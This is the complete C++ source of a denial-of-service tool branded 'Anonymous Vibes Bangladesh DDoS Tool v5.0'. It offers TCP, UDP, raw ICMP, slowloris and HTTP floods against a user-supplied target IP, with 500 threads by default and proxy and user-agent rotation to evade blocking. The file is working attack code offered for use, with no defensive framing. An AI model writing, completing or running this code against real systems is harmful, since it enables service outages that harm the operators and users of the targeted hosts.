#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <csignal>
#include <random>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <curl/curl.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <getopt.h>
#include <fstream>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/select.h>
#include <errno.h>

using namespace std;

// Global variables
atomic<long> success_count(0);
atomic<long> failure_count(0);
atomic<bool> exit_flag(false);
vector<string> user_agents;
vector<string> proxies;

// ANSI Color Codes
const string RED = "\033[31m";
const string GREEN = "\033[32m";
const string YELLOW = "\033[33m";
const string BLUE = "\033[34m";
const string MAGENTA = "\033[35m";
const string CYAN = "\033[36m";
const string RESET = "\033[0m";

void signal_handler(int sig) {
    exit_flag = true;
    cout << RED << "\n[!] Exiting gracefully..." << RESET << endl;
}

void clear_screen() {
    cout << "\033[2J\033[1;1H";
}

void print_banner() {
    clear_screen();
    cout << BLUE << R"(
     _    _       _                         _          ___  ________ _____  
    / \  | | __ _| |_ ___  _ __ _ __   __ _| |_ ___   / _ \|__  / _ \___  | 
   / _ \ | |/ _` | __/ _ \| '__| '_ \ / _` | __/ _ \ | | | | / / | | | / / 
  / ___ \| | (_| | || (_) | |  | | | | (_| | ||  __/ | |_| |/ /| |_| |/ /  
 /_/   \_\_|\__,_|\__\___/|_|  |_| |_|\__,_|\__\___|  \___//____\___//_/   
    )" << RESET << endl;
    cout << CYAN << "\n\tAnonymous Vibes Bangladesh | Author: Wincy Wastn v5.0\n" << RESET << endl;
}

void display_stats() {
    while (!exit_flag) {
        cout << GREEN << "\r[+] Active Attacks: " << RESET;
        cout << YELLOW << "Success: " << success_count;
        cout << RED << " | Failures: " << failure_count << "     " << flush;
        this_thread::sleep_for(chrono::milliseconds(100));
    }
}

unsigned short in_cksum(unsigned short *addr, int len) {
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void set_socket_nonblocking(int sock) {
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
}

void tcp_flood(const string& target, int port, int thread_id) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(32, 126);

    while (!exit_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            failure_count++;
            continue;
        }

        // Set non-blocking
        set_socket_nonblocking(sock);

        // Start non-blocking connect
        int ret = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        if (ret < 0 && errno != EINPROGRESS) {
            close(sock);
            failure_count++;
            continue;
        }

        // Wait for connection with timeout
        fd_set set;
        FD_ZERO(&set);
        FD_SET(sock, &set);
        struct timeval timeout {.tv_sec = 2, .tv_usec = 0};

        ret = select(sock + 1, nullptr, &set, nullptr, &timeout);
        if (ret <= 0) {
            close(sock);
            failure_count++;
            continue;
        }

        // Check connection status
        int error = 0;
        socklen_t len = sizeof(error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len);
        if (error != 0) {
            close(sock);
            failure_count++;
            continue;
        }

        // Send payload
        string payload(1024, 0);
        for (auto& c : payload) c = dis(gen);

        ret = send(sock, payload.c_str(), payload.size(), MSG_NOSIGNAL);
        if (ret <= 0) {
            failure_count++;
        } else {
            success_count++;
        }
        close(sock);
    }
}

void udp_flood(const string& target, int port, int thread_id) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        failure_count++;
        return;
    }

    // Set non-blocking
    set_socket_nonblocking(sock);

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);

    while (!exit_flag) {
        vector<char> payload(1024);
        for (auto& c : payload) c = dis(gen);

        int ret = sendto(sock, payload.data(), payload.size(), 0,
                         (struct sockaddr*)&addr, sizeof(addr));
        if (ret <= 0) {
            if (errno != EWOULDBLOCK && errno != EAGAIN) {
                failure_count++;
            }
        } else {
            success_count++;
        }
    }
    close(sock);
}

void icmp_flood(const string& target, int thread_id) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        failure_count++;
        return;
    }

    // Set non-blocking
    set_socket_nonblocking(sock);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    char packet[64];
    struct icmphdr *icmp = (struct icmphdr *)packet;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = getpid();
    icmp->un.echo.sequence = 0;
    icmp->checksum = 0;
    icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(*icmp));

    while (!exit_flag) {
        int ret = sendto(sock, packet, sizeof(packet), 0,
                        (struct sockaddr*)&addr, sizeof(addr));
        if (ret <= 0) {
            if (errno != EWOULDBLOCK && errno != EAGAIN) {
                failure_count++;
            }
        } else {
            success_count++;
        }
    }
    close(sock);
}

void slowloris(const string& target, int port, int thread_id) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, target.c_str(), &addr.sin_addr);

    vector<int> sockets;
    const string request = "GET / HTTP/1.1\r\n"
                           "Host: " + target + "\r\n"
                           "User-Agent: " + user_agents[rand() % user_agents.size()] + "\r\n"
                           "Connection: keep-alive\r\n\r\n";

    while (!exit_flag) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            failure_count++;
            continue;
        }

        set_socket_nonblocking(sock);

        int ret = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        if (ret < 0 && errno != EINPROGRESS) {
            close(sock);
            failure_count++;
            continue;
        }

        fd_set set;
        FD_ZERO(&set);
        FD_SET(sock, &set);
        struct timeval timeout {.tv_sec = 2, .tv_usec = 0};

        ret = select(sock + 1, nullptr, &set, nullptr, &timeout);
        if (ret <= 0) {
            close(sock);
            failure_count++;
            continue;
        }

        int error = 0;
        socklen_t len = sizeof(error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &error, &len);
        if (error != 0) {
            close(sock);
            failure_count++;
            continue;
        }

        ret = send(sock, request.c_str(), request.size(), MSG_NOSIGNAL);
        if (ret <= 0) {
            close(sock);
            failure_count++;
            continue;
        }

        sockets.push_back(sock);
        success_count++;

        // Send keep-alive headers
        for (auto& s : sockets) {
            string keep_alive = "X-a: " + to_string(rand()) + "\r\n";
            ret = send(s, keep_alive.c_str(), keep_alive.size(), MSG_NOSIGNAL);
            if (ret <= 0) {
                close(s);
                failure_count++;
                sockets.erase(remove(sockets.begin(), sockets.end(), s), sockets.end());
            }
        }
        this_thread::sleep_for(chrono::seconds(10));
    }

    for (auto& s : sockets) close(s);
}

size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    return size * nmemb; // Handle response if needed
}

void http_flood(const string& url, int thread_id) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        failure_count++;
        return;
    }

    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> ua_dist(0, user_agents.size()-1);
    uniform_int_distribution<> proxy_dist(0, proxies.size()-1);

    // Reuse curl handle for performance
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agents[ua_dist(gen)].c_str());

    if (!proxies.empty()) {
        curl_easy_setopt(curl, CURLOPT_PROXY, proxies[proxy_dist(gen)].c_str());
    }

    while (!exit_flag) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            success_count++;
        } else {
            failure_count++;
        }
    }
    curl_easy_cleanup(curl);
}


void print_help() {
    cout << CYAN << "Anonymous Vibes Bangladesh DDoS Tool v5.0\n\n"
         << RESET << "Usage: avb-ddos [OPTIONS]\n\n"
         << "Options:\n"
         << "  -h, --help            Show help message\n"
         << "  -v, --version         Show version info\n"
         << "  -t, --target IP       Target IP address\n"
         << "  -p, --port PORT       Target port\n"
         << "  --http                HTTP Flood attack\n"
         << "  --tcp                 TCP Flood attack\n"
         << "  --udp                 UDP Flood attack\n" 
         << "  --icmp                ICMP Flood attack\n"
         << "  --slowloris           Slowloris attack\n"
         << "  --threads NUM         Number of threads (default: 500)\n"
         << "  --proxy FILE          Proxy list file\n"
         << "  --useragents FILE     User-Agents file\n"
         << "  --timeout SEC         Connection timeout\n"
         << "  --duration SEC        Attack duration\n"
         << RESET << endl;
}

void load_from_file(const string& filename, vector<string>& target) {
    ifstream file(filename);
    if (!file.is_open()) {
        cerr << RED << "[!] Error opening file: " << filename << RESET << endl;
        exit(1);
    }
    string line;
    while (getline(file, line)) {
        if (!line.empty()) target.push_back(line);
    }
}



int main(int argc, char* argv[]) {
  signal(SIGINT, signal_handler);

  struct option long_options[] = {
      {"help", no_argument, 0, 'h'},
      {"version", no_argument, 0, 'v'},
      {"target", required_argument, 0, 't'},
      {"port", required_argument, 0, 'p'},
      {"http", no_argument, 0, 1},
      {"tcp", no_argument, 0, 2},
      {"udp", no_argument, 0, 3},
      {"icmp", no_argument, 0, 4},
      {"slowloris", no_argument, 0, 5},
      {"threads", required_argument, 0, 6},
      {"proxy", required_argument, 0, 7},
      {"useragents", required_argument, 0, 8},
      {"timeout", required_argument, 0, 9},
      {"duration", required_argument, 0, 10},
      {0, 0, 0, 0}
  };

  string target, mode;
  int port = 0, threads = 500, timeout = 10, duration = 0;
  string proxy_file, ua_file;

  while (true) {
      int opt_index = 0;
      int c = getopt_long(argc, argv, "hvt:p:", long_options, &opt_index);
      if (c == -1) break;

      switch (c) {
          case 'h':
              print_banner();
              print_help();
              return 0;
          case 'v':
              print_banner();
              cout << CYAN << "Version 5.0 (RedEye Edition)\n" << RESET;
              return 0;
          case 't':
              target = optarg;
              break;
          case 'p':
              port = stoi(optarg);
              break;
          case 1: mode = "http"; break;
          case 2: mode = "tcp"; break;
          case 3: mode = "udp"; break;
          case 4: mode = "icmp"; break;
          case 5: mode = "slowloris"; break;
          case 6: threads = stoi(optarg); break;
          case 7: proxy_file = optarg; break;
          case 8: ua_file = optarg; break;
          case 9: timeout = stoi(optarg); break;
          case 10: duration = stoi(optarg); break;
          default:
              print_help();
              return 1;
      }
  }

  if (target.empty() || port == 0 || mode.empty()) {
      cerr << RED << "[!] Missing required arguments!\n" << RESET;
      print_help();
      return 1;
  }

  if (!ua_file.empty()) load_from_file(ua_file, user_agents);
  if (!proxy_file.empty()) load_from_file(proxy_file, proxies);

  if (user_agents.empty()) {
      user_agents = {
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...",
          "Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36..."
      };
  }

  print_banner();

  vector<thread> attack_threads;
  string url = "http://" + target + ":" + to_string(port);

  for (int i = 0; i < threads; ++i) {
      if (mode == "tcp") {
          attack_threads.emplace_back(tcp_flood, target, port, i);
      } else if (mode == "http") {
          attack_threads.emplace_back(http_flood, url, i);
      } else if (mode == "udp") {
          attack_threads.emplace_back(udp_flood, target, port, i);
      } else if (mode == "icmp") {
          attack_threads.emplace_back(icmp_flood, target, i);
      } else if (mode == "slowloris") {
          attack_threads.emplace_back(slowloris, target, port, i);
      }
  }

  thread stats_thread(display_stats);

  if (duration > 0) {
      this_thread::sleep_for(chrono::seconds(duration));
      exit_flag = true;
  } else {
      while (!exit_flag) this_thread::sleep_for(chrono::milliseconds(100));
  }

  for (auto& t : attack_threads) {
      if (t.joinable()) t.join();
  }

  exit_flag = true;
  stats_thread.join();

  return 0;
}
